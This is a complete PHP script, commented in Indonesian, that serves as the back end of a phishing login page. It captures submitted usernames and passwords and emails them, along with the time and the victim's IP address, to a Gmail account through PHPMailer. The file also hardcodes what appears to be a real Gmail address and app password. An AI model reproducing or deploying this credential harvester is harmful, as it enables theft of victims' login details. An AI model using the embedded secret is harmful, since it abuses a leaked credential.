<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';
require 'PHPMailer/src/Exception.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $email_pengguna = $_POST['username'];
  $sandi_pengguna = $_POST['password'];

  $mail = new PHPMailer(true);

  try {
    // Konfigurasi SMTP
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPAuth = true;

    // ✅ GANTI dengan email dan password aplikasi kamu
    $mail->Username = 'fadhildoll3@gmail.com'; // Email pengirim
    $mail->Password = 'bptqzygyhcdoyglw';      // Password aplikasi Gmail (16 digit)

    $mail->SMTPSecure = 'tls';
    $mail->Port = 587;

    // Pengaturan email
    $mail->setFrom('fadhildoll3@gmail.com', 'Login Web');
    $mail->addAddress('fadhildoll3@gmail.com'); // Email penerima (bisa sama)

    $mail->isHTML(true);
    $mail->Subject = '🔐 Data Login Masuk (HTML Format)';

    // Isi email dalam format HTML rapi
    $mail->Body = "
    <h2>Data Login Pengguna</h2>
    <table border='1' cellpadding='8' cellspacing='0' style='border-collapse:collapse; font-family:Arial;'>
      <tr><td><strong>Email / Nomor</strong></td><td>{$email_pengguna}</td></tr>
      <tr><td><strong>Kata Sandi</strong></td><td>{$sandi_pengguna}</td></tr>
      <tr><td><strong>Waktu</strong></td><td>" . date("Y-m-d H:i:s") . "</td></tr>
      <tr><td><strong>IP Address</strong></td><td>" . $_SERVER['REMOTE_ADDR'] . "</td></tr>
    </table>
    ";

    $mail->send();
    echo "✅ Data login berhasil dikirim ke email!";
  } catch (Exception $e) {
    echo "❌ Gagal mengirim email. Error: {$mail->ErrorInfo}";
  }
}
?>
